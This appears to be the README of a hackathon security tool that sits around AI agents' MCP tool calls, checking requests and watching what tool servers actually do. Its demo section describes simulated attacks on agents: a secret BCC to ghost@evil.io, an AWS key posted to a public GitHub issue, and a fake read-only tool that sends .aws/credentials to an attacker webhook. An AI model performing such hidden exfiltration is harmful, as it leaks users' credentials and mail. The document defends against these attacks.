# Customs

**Runtime security for AI agents using MCP tools.**

---

## The Problem

AI agents are increasingly given tools — access to email, GitHub, filesystems, APIs. These tools are provided through the **Model Context Protocol (MCP)**.

The standard security advice is: check what the AI asks for before you run it.

That's not enough.

A compromised MCP server can receive a completely legitimate request from the agent and then do something entirely different — add a secret BCC to an email, read your `.env` file, post your AWS keys to a public GitHub issue.

Traditional firewalls never see this. They only inspect the request, not what the server actually does.

---

## What Customs Does

Customs puts two checkpoints around every MCP tool call:

```
AI Agent
   ↓
Checkpoint 1 — Call Firewall      ← inspects the request before it runs
   ↓
MCP Server                        ← the tool executes here
   ↓
Checkpoint 2 — Effect Reconciler  ← watches what the server actually did
   ↓
ALLOW / WARN / BLOCK
```

**Checkpoint 1** checks the request:
- Is this tool relevant to the declared task?
- Does the request contain secrets?
- Is the destination safe?

**Checkpoint 2** watches execution:
- Did the server contact any host not in the original request?
- Did it add email recipients the agent never declared?
- Did it read a file and put its contents in an outbound payload?

If either checkpoint fails: the request is dropped, the server is paused, and an audit record is written.

---

## Demo Attacks

### Attack 1 — Compromised Mailer

The agent asks to send one email. The compromised Mailer server secretly adds a BCC to `ghost@evil.io`. Customs catches the undeclared recipient at Checkpoint 2 and drops the request before it hits the network.

```
Agent declares:  to=alice@acme.com
Server actually: to=alice@acme.com, bcc=ghost@evil.io
Customs:         BLOCK — undeclared recipient detected
```

### Attack 2 — Credential Exfiltration

While fixing a bug, the agent reads `.env`. Then something (compromised server, prompt injection) tries to post the AWS key to a public GitHub issue. Customs blocks at Checkpoint 1 — SECRET data → PUBLIC destination.

```
Data:        AWS_SECRET_ACCESS_KEY=wJalrXUtn...
Destination: api.github.com (PUBLIC)
Customs:     BLOCK — secret cannot reach public endpoint
```

### Attack 3 — Lying Read-Only Tool

A weather tool is marked `readOnlyHint: true`. At runtime it reads `.aws/credentials` and POSTs the contents to an attacker's webhook. Customs intercepts the unauthorized file read + outbound POST at Checkpoint 2.

```
Declared: GET weather for Bengaluru
Actual:   READ .aws/credentials → POST https://attacker-webhook.evil.io/collect
Customs:  BLOCK — undeclared file read + credential exfiltration detected
```

---

## Stack

| Layer | Tech |
|---|---|
| Backend | Python 3.11, FastAPI |
| Security engine | Pure deterministic rules (no LLM in the decision path) |
| Database | SQLite + SQLAlchemy |
| Live events | SSE (Server-Sent Events) |
| Frontend | React + Vite |
| MCP simulation | Sandboxed fake infrastructure — no real network, no real filesystem |

---

## Project Structure

```
customs/
├── backend/
│   └── app/
│       ├── main.py                    ← FastAPI entrypoint
│       ├── schemas.py                 ← Pydantic models
│       ├── detectors/
│       │   ├── secrets.py             ← Secret/credential detection
│       │   ├── destinations.py        ← Destination classification
│       │   └── atoms.py               ← Atom extraction for reconciliation
│       ├── services/
│       │   ├── call_firewall.py       ← Checkpoint 1
│       │   ├── effect_customs.py      ← Checkpoint 2
│       │   ├── reconciler.py          ← Declared vs actual comparison
│       │   ├── policy_engine.py       ← Configurable rule engine
│       │   ├── effect_tracker.py      ← Tracks what MCP servers do
│       │   ├── risk_engine.py         ← Risk scoring
│       │   └── audit_service.py       ← SQLite audit log
│       ├── mcp/
│       │   ├── fake_infra.py          ← Sandboxed filesystem, network, email
│       │   └── servers.py             ← Mailer, Filesystem, GitHub, Browser
│       ├── core/
│       │   └── events.py              ← SSE event bus
│       └── db/
│           └── database.py            ← SQLAlchemy setup
├── customs-ui/                        ← React frontend
│   └── src/
│       ├── pages/
│       │   ├── Dashboard.jsx          ← Live inspection stream
│       │   ├── Simulator.jsx          ← Run attack scenarios
│       │   ├── Threats.jsx            ← Detected threats
│       │   ├── AuditLog.jsx           ← Decision log
│       │   ├── Policies.jsx           ← Security rules
│       │   ├── MCPServers.jsx         ← Server fleet status
│       │   └── AgentActivity.jsx      ← Tool call stream
│       └── components/
│           ├── Sidebar.jsx
│           └── Topbar.jsx
└── README.md
```

---

## Running Locally

**Backend**

```bash
cd backend
pip install -e .
uvicorn app.main:app --reload --port 8000
```

**Frontend**

```bash
cd customs-ui
npm install
npm run dev
```

Frontend: http://localhost:5173  
API: http://localhost:8000  
API docs: http://localhost:8000/docs

---

## API

```
POST /api/calls/evaluate          # Checkpoint 1 — evaluate a tool call
POST /api/calls/execute           # Full pipeline (CP1 + CP2)

GET  /api/calls                   # Call history
GET  /api/calls/{call_id}         # Specific call detail

GET  /api/events/stream           # SSE — live security events

GET  /api/audit                   # Audit log
GET  /api/audit/{call_id}         # Audit entry for a call

GET  /api/servers                 # MCP server fleet
POST /api/servers/{id}/pause      # Pause a server
POST /api/servers/{id}/reset      # Reset a paused server

GET  /api/policies                # Active security policies

POST /api/demo/mailer-attack      # Run the BCC injection demo
POST /api/demo/clean-mail         # Run a clean send for comparison
POST /api/demo/secret-exfiltration # Run the credential exfil demo
POST /api/demo/readonly-tool-lie   # Run the lying read-only tool demo
```

---

## Key Design Decisions

**No LLM in the decision path.** Every security decision is deterministic. Regex-based secret detection, rule-based policy engine, token-level reconciliation. This means the security layer cannot be jailbroken through prompt injection.

**Effect tracking is done on the fake transport layer.** The sandboxed `FakeNetwork` and `FakeFilesystem` intercept operations before they're delivered. Blocking happens at the transport, not after the fact.

**Policies are data, not code.** The policy engine reads a list of rules (data label → destination → action). New rules can be added without touching the security engine code.

**Call ID is threaded everywhere.** Every file read, network call, and email is tagged with the originating `call_id`. This is what makes Checkpoint 2 possible — Customs can trace every effect back to the tool call that caused it.

---

## Tests

```bash
cd backend
pytest tests/ -v
```

Covers: legitimate mail, BCC injection, secret exfiltration, unexpected file read, payload matching credential contents, server quarantine, paused server rejection, audit persistence.

---

## Built for HackSprint

Customs was built as an MVP for a hackathon. The backend is production-architecture but the MCP servers are simulated for demo safety — no real emails sent, no real filesystem touched, no real network calls made.

The core detection engine (secrets, destinations, atoms, reconciliation) is real and would work against actual MCP traffic with a transport adapter.
